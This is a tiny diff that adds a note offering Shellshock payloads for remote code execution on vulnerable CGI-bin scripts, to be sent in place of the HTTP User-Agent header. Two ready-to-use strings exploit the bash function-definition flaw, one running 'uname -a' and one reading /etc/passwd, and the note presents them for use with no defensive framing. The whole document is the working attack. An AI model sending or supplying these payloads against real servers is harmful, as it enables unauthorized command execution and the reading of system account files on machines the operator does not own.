@@ -1,0 +1,7 @@
+You can use this RCE by replace user agent with one of these code 
+CGI-BIN VULN
+
+
+ ()  { :; }; echo; /bin/uname -a
+ ()  { :; }; echo; /bin/cat  /etc/passwd
+
